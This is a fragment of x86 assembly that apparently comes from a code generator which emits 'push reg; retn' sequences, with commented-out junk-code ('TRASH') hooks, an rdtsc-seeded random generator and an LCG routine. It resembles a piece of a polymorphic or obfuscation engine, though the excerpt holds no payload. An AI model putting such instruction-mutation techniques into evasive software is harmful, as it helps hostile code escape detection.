	; -------------------------------------------------------
	; <rpush> <reg>
	; retn
	; -------------------------------------------------------
	
	call	@GenRegPush
	mov		al, 0c3h
	
	;FLUSHTRASH
	;TRASH
	
	stosb
	
ret
; -----------------------------------------------------------------

@Randomize:

	rdtsc
	mov		[ebp].dwRndSeed, eax
	
ret

; -----------------------------------------------------------------

@GetRandom:

	push 	edx
	push 	ebx	

	xchg 	ebx, eax

	mov     eax, [ebp].dwRndSeed
	imul    eax, 8088405h
	inc     eax
	mov     [ebp].dwRndSeed, eax
	
	test	ebx, ebx
	jz		@rnd_exit

	xor     edx, edx
	mul     ebx
	xchg    edx, eax

@rnd_exit:

	pop		ebx
	pop 	edx

ret
